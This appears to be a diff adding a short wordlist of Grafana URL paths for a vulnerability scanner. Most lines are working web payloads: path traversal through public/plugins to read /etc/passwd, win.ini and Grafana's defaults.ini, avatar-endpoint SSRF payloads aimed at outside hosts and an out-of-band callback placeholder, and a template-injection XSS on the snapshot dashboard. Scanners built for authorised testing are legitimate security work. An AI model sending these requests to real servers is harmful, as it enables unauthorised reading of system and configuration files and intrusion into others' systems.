@@ -1,0 +1,13 @@
+/login?redirect=%2F
+/login
+/api/snapshots/:key
+/api/snapshots
+/avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1
+/grafana/avatar/1%3fd%3dhttp%3A%252F%252Fimgur.com%252F..%25252F1.1.1.1
+/avatar/test%3fd%3dredirect.rhynorater.com%25253f%253b%252fbp.blogspot.com%252f{{interactsh-url}}
+/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../etc/passwd
+/public/plugins/alertlist/../../../../../../../../../../../../../../../../../../../windows/win.ini
+/public/plugins/alertlist/../../../../../conf/defaults.ini
+/public/plugins/{{pluginSlug}}/../../../../../../../../../../../../../../../../../../../etc/passwd
+/dashboard/snapshot/%7B%7Bconstructor.constructor(%27alert(document.domain)%27)()%7D%7D?orgId=1
+/public/plugins/welcome/../../../../../../../../etc/passwd
